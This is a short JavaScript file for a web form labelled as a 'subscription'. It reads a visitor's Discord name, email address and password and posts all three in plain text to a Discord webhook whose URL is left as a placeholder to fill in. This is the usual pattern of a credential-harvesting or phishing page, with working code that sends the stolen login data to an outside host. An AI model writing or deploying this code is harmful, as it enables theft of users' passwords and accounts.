// script.js
function submitForm() {
    var discordName = document.getElementById("discordName").value;
    var email = document.getElementById("email").value;
    var password = document.getElementById("password").value;

    // Prepare the data to send to Discord webhook
    var formData = {
        content: `New subscription:\nDiscord Name: ${discordName}\nEmail: ${email}\nPassword: ${password}`
    };

    // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
    var webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';

    // Send the data to Discord webhook
    sendToDiscordWebhook(webhookUrl, formData);
}

function sendToDiscordWebhook(url, data) {
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        console.log('Data sent successfully to Discord webhook');
    })
    .catch((error) => {
        console.error('Error sending data to Discord webhook:', error);
    });
}
